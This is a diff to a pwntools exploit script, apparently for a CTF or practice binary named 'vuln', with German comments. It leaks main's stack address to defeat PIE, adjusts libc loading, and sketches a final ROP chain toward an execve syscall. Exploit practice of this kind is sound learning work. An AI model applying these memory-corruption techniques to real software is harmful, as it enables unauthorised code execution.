@@ -4,7 +4,7 @@ from os import execv
 from pwn import *
 
 exe = context.binary = ELF("./vuln", checksec=False)
-libc = ELF("/usr/lib/libc.so.6", checksec=False) # load libc; get via ldd vuln
+libc = exe.libc
 #context.log_level = "error"
 
 def start(argv=[], *a, **kw):
@@ -26,12 +26,13 @@ def start(argv=[], *a, **kw):
 
 def main():
     io = start()
-
+    
     # 1. Part get Exe Base Path
     io.recvuntil(b":")
     offset = 0x37 # da liegt main auf dem Stack 
     io.sendline(cyclic(offset))
     leakedAddr = io.recvuntil(b"data!")[28 + offset :34 + offset] # grep only die adresse
+    print(leakedAddr)
     leakedAddr = u64(leakedAddr.ljust(8, b"\x00"))
 
     exe.address = leakedAddr - exe.sym.main
@@ -56,6 +57,10 @@ def main():
 
     io.sendline()
     io.recvuntil(b"data!")
+
+    # Letzte Chain die den Aufruf macht
+    # Eig. müsste man hier die Strings im Speicher konstruieren (RW)
+    # + dann halt execve syscall vorbereiten
 
     r = ROP(exe)
 
